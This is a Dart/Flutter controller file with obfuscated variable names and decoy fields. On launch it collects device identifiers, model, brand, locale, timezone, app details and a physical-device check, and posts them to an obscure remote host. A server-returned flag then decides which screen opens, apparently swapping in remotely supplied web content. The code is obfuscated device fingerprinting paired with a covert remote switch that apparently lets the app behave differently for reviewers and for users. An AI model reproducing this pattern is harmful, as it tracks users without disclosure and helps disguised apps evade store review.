import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var truagps = RxBool(false);
  var hxsgqudyrf = RxBool(true);
  var qyrbi = RxString("");
  var deonte = RxBool(false);
  var streich = RxBool(true);
  final nixsyj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    letw();
  }


  Future<void> letw() async {

    deonte.value = true;
    streich.value = true;
    hxsgqudyrf.value = false;

    nixsyj.post("https://klan.lilipa.xyz/sugjpxvfdkeyhrnoz",data: await wtzbksv()).then((value) {
      var ibykmt = value.data["ibykmt"] as String;
      var wqcbx = value.data["wqcbx"] as bool;
      if (wqcbx) {
        qyrbi.value = ibykmt;
        magdalen();
      } else {
        koch();
      }
    }).catchError((e) {
      hxsgqudyrf.value = true;
      streich.value = true;
      deonte.value = false;
    });
  }

  Future<Map<String, dynamic>> wtzbksv() async {
    final DeviceInfoPlugin ciqtngpr = DeviceInfoPlugin();
    PackageInfo oxgba_hlsqe = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nyjaczw = Platform.localeName;
    var lbgh = currentTimeZone;

    var lfyjmevn = oxgba_hlsqe.packageName;
    var xwji = oxgba_hlsqe.version;
    var nhruzcgy = oxgba_hlsqe.buildNumber;

    var zkdsvp = oxgba_hlsqe.appName;
    var epgl = "";
    var websterStracke = "";
    var wqkt  = "";
    var zykto = "";
    var juanitaNikolaus = "";
    var tyreseBuckridge = "";
    var buddyLarson = "";
    var elinorFadel = "";


    var sbqgclm = "";
    var fnbhrsea = false;

    if (GetPlatform.isAndroid) {
      sbqgclm = "android";
      var ulpcbqktv = await ciqtngpr.androidInfo;

      zykto = ulpcbqktv.brand;

      epgl  = ulpcbqktv.model;
      wqkt = ulpcbqktv.id;

      fnbhrsea = ulpcbqktv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      sbqgclm = "ios";
      var wjfuevyhxs = await ciqtngpr.iosInfo;
      zykto = wjfuevyhxs.name;
      epgl = wjfuevyhxs.model;

      wqkt = wjfuevyhxs.identifierForVendor ?? "";
      fnbhrsea  = wjfuevyhxs.isPhysicalDevice;
    }
    var res = {
      "lfyjmevn": lfyjmevn,
      "nhruzcgy": nhruzcgy,
      "epgl": epgl,
      "lbgh": lbgh,
      "websterStracke" : websterStracke,
      "zkdsvp": zkdsvp,
      "zykto": zykto,
      "xwji": xwji,
      "wqkt": wqkt,
      "nyjaczw": nyjaczw,
      "sbqgclm": sbqgclm,
      "tyreseBuckridge" : tyreseBuckridge,
      "fnbhrsea": fnbhrsea,
      "juanitaNikolaus" : juanitaNikolaus,
      "buddyLarson" : buddyLarson,
      "elinorFadel" : elinorFadel,

    };
    return res;
  }

  Future<void> koch() async {
    Get.offAllNamed("/orderTab");
  }

  Future<void> magdalen() async {
    Get.offAllNamed("/orderTool");
  }

}
